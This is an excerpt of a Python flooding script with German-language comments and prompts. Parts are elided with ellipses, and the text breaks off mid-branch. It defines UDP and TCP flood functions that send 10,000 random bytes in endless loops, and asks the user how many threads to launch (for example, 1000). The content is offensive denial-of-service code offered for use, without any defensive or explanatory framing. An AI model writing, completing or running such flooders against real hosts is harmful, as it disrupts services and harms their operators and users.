...
def udp_flood(ip, port):
    ...
    udp_bytes = random._urandom(10000)
    while True:
...
def tcp_flood(ip, port):
    while True:
        ...
        try:
            ...
            sock.send(random._urandom(10000))
        except:
            pass
        finally:
            sock.close()
...
# Benutzer gibt die Anzahl der Threads ein
num_threads = int(input("Gib die Anzahl der Threads ein (z. B. 1000): "))

# Starte die Threads basierend auf der Benutzereingabe
if method == "1":
